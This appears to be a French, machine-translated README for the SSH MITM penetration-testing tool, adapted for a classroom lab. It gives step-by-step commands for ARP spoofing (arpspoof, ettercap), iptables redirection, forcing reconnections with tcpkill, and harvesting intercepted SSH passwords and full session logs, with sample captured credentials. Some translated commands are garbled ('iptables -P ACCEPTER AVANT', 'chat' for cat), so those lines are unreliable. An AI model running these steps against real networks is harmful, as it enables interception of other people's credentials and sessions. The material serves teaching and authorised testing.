# SSH MITM v2.3-dev

Author: [Joe Testa](https://www.positronsecurity.com/company/) ([@therealjoetesta](https://twitter.com/therealjoetesta))


## Introduction

Cet outil de test d'intrusion permet à un auditeur d'intercepter les connexions SSH. Un correctif appliqué au code source d'OpenSSH v7.5p1 le fait agir comme un proxy entre la victime et son serveur SSH prévu ; tous les mots de passe et sessions en texte clair sont enregistrés sur le disque.

Bien entendu, le client SSH de la victime se plaindra du changement de clé du serveur. Mais comme 99,99999 % du temps, cela est dû à une action légitime (réinstallation du système d'exploitation, modification de la configuration, etc.), la plupart des utilisateurs ignoreront l'avertissement et continueront.

Cet outil est à utiliser dans le Travail Dirigé  MITM-SSH fournit durant la séance : une solution de rmdiation sera proposé durant l'exercice.

***Remarques:** exécutez uniquement le sshd_mitm modifié dans une VM ou un conteneur ! Des modifications ponctuelles ont été apportées aux sources OpenSSH dans les régions critiques, sans égard à leurs implications en matière de sécurité. Il n'est pas difficile d'imaginer que ces modifications introduisent de graves vulnérabilités.

## Change Log

* v2.3 : ??? : Ajout de la prise en charge de Linux Mint 20 et Ubuntu 20.
* v2.2 : 16 septembre 2019 : correction de l'installation sur Kali et Linux Mint 19. Correction d'une invite de double mot de passe qui se produisait dans certaines conditions. Journalisation des erreurs améliorée.
* v2.1 : 4 janvier 2018 : activation de l'exécution de commandes non interactives, les connexions aux anciens serveurs dotés d'algorithmes faibles peuvent désormais être interceptées, correction de deux bugs majeurs qui entraînaient la suppression de certaines connexions par AppArmor et amélioration de la journalisation des erreurs.
* v2.0 : 12 septembre 2017 : ajout de la prise en charge complète de SFTP (!) et du confinement AppArmor.
* v1.1 : 6 juillet 2017 : suppression des dépendances des privilèges root, ajout d'un programme d'installation automatique, ajout de la prise en charge de Kali Linux, ajout du script *JoesAwesomeSSHMITMVictimFinder.py* pour trouver des cibles potentielles sur un réseau local.
* v1.0 : 16 mai 2017 : révision initiale.



## Exécuter l'image Docker

Le moyen le plus rapide et le plus simple de commencer consiste à utiliser l'image Docker avec SSH MITM pré-construit.

1.) Obtenez l'image depuis Dockerhub avec :

     $ docker pull positronsecurity/ssh-mitm

2.) Ensuite, exécutez le conteneur avec :

     $ mkdir -p ${PWD}/ssh_mitm_logs && docker run --network=host -it --rm -v ${PWD}/ssh_mitm_logs:/home/ssh-mitm/log positronsecurity/ssh-mitm

3.) Activez le transfert IP et les routes NAT sur votre machine hôte :

     # echo 1 > /proc/sys/net/ipv4/ip_forward
     # iptables -P ACCEPTER AVANT
     # iptables -A INPUT -p tcp --dport 2222 -j ACCEPTER
     # iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222

4.) Recherchez des cibles sur le réseau local et usurpez-les par ARP (voir ci-dessous).

5.) Les sessions Shell et SFTP seront enregistrées dans le répertoire `ssh_mitm_logs`.


## La configuration initiale

En tant qu'utilisateur root, exécutez le script *install.sh*. Cela installera les prérequis à partir des référentiels, téléchargera l'archive OpenSSH, vérifiera sa signature, la compilera et initialisera un environnement non privilégié pour y exécuter.


## Trouver des cibles

Le script *JoesAwesomeSSHMITMVictimFinder.py* facilite grandement la recherche de cibles sur un réseau local. Il usurpera ARP un bloc d’adresses IP et détectera le trafic SSH pendant une courte période avant de passer au bloc suivant. Toutes les connexions SSH en cours provenant de périphériques sur le réseau local sont signalées.

Par défaut, *JoesAwesomeSSHMITMVictimFinder.py* usurpera et reniflera ARP uniquement 5 adresses IP à la fois pendant 20 secondes avant de passer au bloc suivant de 5. Ces paramètres peuvent être ajustés, bien qu'il existe un compromis : plus il y a d'adresses IP usurpées. à la fois, plus vous aurez de chances d'établir une connexion SSH en cours, mais aussi plus la pression que vous exercerez sur votre interface réseau chétive sera grande. Sous une charge trop élevée, votre interface commencera à perdre des trames, provoquant un déni de service et élevant considérablement les soupçons (c'est mauvais). Les valeurs par défaut ne devraient pas poser de problèmes dans la plupart des cas, même si la recherche des cibles prendra plus de temps. La taille des blocs peut être augmentée en toute sécurité sur les réseaux à faible utilisation.

Exemple:

     # ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s3 --ignore-ips 10.11.12.50,10.11.12.53
     Adresse locale trouvée 10.11.12.141 et ajout à la liste des ignorés.
     Utilisation du réseau CIDR 10.11.12.141/24.
     Passerelle par défaut trouvée : 10.11.12.1
     Les blocs IP de taille 5 seront usurpés pendant 20 secondes chacun.
     Les adresses IP suivantes seront ignorées : 10.11.12.50 10.11.12.53 10.11.12.141


Clientèle locale :
       * 10.11.12.70 -> 174.129.77.155:22
       * 10.11.12.43 -> 10.11.99.2:22

Le résultat ci-dessus montre que deux appareils sur le réseau local ont créé des connexions SSH (10.11.12.43 et 10.11.12.70) ; ceux-ci peuvent être la cible d’une attaque de l’homme du milieu. Notez cependant que pour potentiellement intercepter les informations d’identification, vous devrez attendre qu’elles établissent de nouvelles connexions. Les pentesters impatients peuvent choisir de fermer de force les sessions SSH existantes (à l'aide de l'outil *tcpkill*), invitant les clients à en créer de nouvelles immédiatement...


## Lancer l'attaque

1.) Une fois que vous avez terminé la configuration initiale et trouvé une liste de victimes potentielles (voir ci-dessus), exécutez *start.sh* en tant que root. Cela démarrera *sshd_mitm*, activera le transfert IP et configurera l'interception des paquets SSH via *iptables*.

2.) ARP usurpe la ou les cibles (**Protip :** n'usurpez PAS tout ! Votre petite interface réseau ne sera probablement pas capable de gérer l'ensemble du trafic d'un réseau en même temps. Usurpez seulement quelques adresses IP à la fois. une fois):

     arpspoof -r -t 192.168.x.1 192.168.x.5

Alternativement, vous pouvez utiliser l'outil *ettercap* :

     ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//

3.) Surveillez *auth.log*. Les mots de passe interceptés apparaîtront ici :

     sudo tail -f /var/log/auth.log

4.) Une fois la session établie, un journal complet de toutes les entrées et sorties peut être trouvé dans */home/ssh-mitm/*. Les sessions SSH sont enregistrées sous *shell_session_\*.txt* et les sessions SFTP sont enregistrées sous *sftp_session_\*.html* (avec les fichiers transférés stockés dans un répertoire correspondant).


## Exemples de résultats

En cas de succès, */var/log/auth.log* aura des lignes qui enregistrent le mot de passe, comme ceci :

     11 septembre 19:28:14 showmeyourmoves sshd_mitm[16798] : MOT DE PASSE INTERCEPTÉ : nom d'hôte : [10.199.30.x] ; nom d'utilisateur : [jdog] ; mot de passe : [supercalifragilistic] [preauth]

De plus, l'intégralité de la session SSH de la victime est enregistrée :

     # chat /home/ssh-mitm/shell_session_0.txt
     Nom d'hôte : 10.199.30.x
     Nom d'utilisateur : jdog
     Mot de passe : supercalifragiliste
     -------------------------
     Dernière connexion : jeu. 31 août 2017 17:42:38
     OpenBSD 6.1 (GENERIC.MP) #21 : mercredi 30 août 08:21:38 CEST 2017

     Bienvenue sur OpenBSD : le système d'exploitation de type Unix sécurisé de manière proactive.

     Veuillez utiliser l'utilitaire sendbug(1) pour signaler les bogues dans le système.
     Avant de signaler un bug, essayez de le reproduire avec la dernière version
     version du code. Avec les rapports de bogues, essayez de vous assurer que
     suffisamment d'informations pour reproduire le problème sont jointes, et si un
     Un correctif connu existe, incluez-le également.

     jdog@jefferson ~ $ ppss
       COMMANDE TEMPS STAT TT PID
     59264 p0 Ss 0:00.02 -bash (bash)
     52132 p0 R+p 0:00.00ps
     jdog@jefferson ~ $ iidd
     uid=1000(jdog) gid=1000(jdog) groupes=1000(jdog), 0(roue)
     jdog@jefferson ~ $ sssshh jjtteessttaa@@mmaaggiiccbbooxx
     Mot de passe de jtesta@magicbox : ROFLC0PTER!!1juan


Notez que les caractères des commandes de l'utilisateur apparaissent deux fois dans le fichier car l'entrée de l'utilisateur est enregistrée, ainsi que la sortie du shell (qui renvoie les caractères). Notez que lorsque des programmes comme *sudo* et *ssh* désactivent temporairement l'écho afin de lire un mot de passe, les caractères en double ne sont pas enregistrés.

Toutes les activités SFTP sont également capturées. Utilisez un navigateur pour afficher *sftp_session_0.html*. Il contient un journal des commandes, avec des liens vers les fichiers chargés et téléchargés :

     # cat /home/ssh-mitm/sftp_session_0.txt
     <html><pre>Nom d'hôte : 10.199.30.x
     Nom d'utilisateur : jdog
     Mot de passe : supercalifragiliste
     -------------------------
     > chemin réel "." (Résultat : /home/jdog)
     > chemin réel "/home/jdog/." (Résultat : /home/jdog)
     > ls /home/jdog
     drwxr-xr-x 4 jdog jdog 4096 11 septembre 16:12 .
     drwxr-xr-x 4 racine racine 4096 6 septembre 11:53 ..
     -rw-r--r-- 1 jdog jdog 3771 31 août 2015 .bashrc
     -rw-r--r-- 1 jdog jdog 220 31 août 2015 .bash_logout
     drwx------ 2 jdog jdog 4096 6 septembre 11:54 .cache
     -rw-r--r-- 1 jdog jdog 655 16 mai 08:49 .profile
     drwx------ 2 jdog jdog 4096 8 septembre 16:59 .ssh
     -rw-rw-r-- 1 jdog jdog 5242880 8 septembre 15:52 fichier
     -rw-rw-r-- 1 jdog jdog 43131 10 septembre 10:47 fichier2
     -rw-rw-r-- 1 jdog jdog 83 6 septembre 12:56 fichier3
     -rw-rw-r-- 1 jdog jdog 3048960 11 septembre 13:51 fichier4

     > chemin réel "/home/jdog/file5" (Résultat : /home/jdog/file5)
     > mettez <a href="sftp_session_0/file5">/home/jdog/file5</a>
     > chemin réel "/home/jdog/file5" (Résultat : /home/jdog/file5)
     > stat "/home/jdog/file5" (Résultat : flags : 15 ; taille : 854072 ; uid : 1001 ; gid : 1001 ; perm : 0100664, atime : 1505172831, mtime : 1505172831)
     > setstat "/home/jdog/file5" (Résultat : flags : 4 ; taille : 0 ; uid : 0 ; gid : 0 ; perm : 0100700, atime : 0, mtime : 0)
     </pre></html>


## Documentation du développeur

Dans *lol.h* se trouvent deux définitions : *DEBUG_HOST* et *DEBUG_PORT*. Activez-les et définissez le nom d'hôte sur un serveur de test. Vous pouvez désormais vous connecter directement à *sshd_mitm* sans utiliser l'usurpation d'identité ARP afin de tester vos modifications, par exemple :

     ssh -p 2222 valid_user_on_debug_host@localhost

Pour tester les modifications apportées au code source OpenSSH, utilisez le script *dev/redeploy.sh*.

Pour voir une différence entre les modifications non validées, utilisez le script *dev/make_diff_of_uncommitte_changes.sh*.

Pour régénérer un correctif complet pour les sources OpenSSH, utilisez le script *dev/regenerate_patch.sh*.
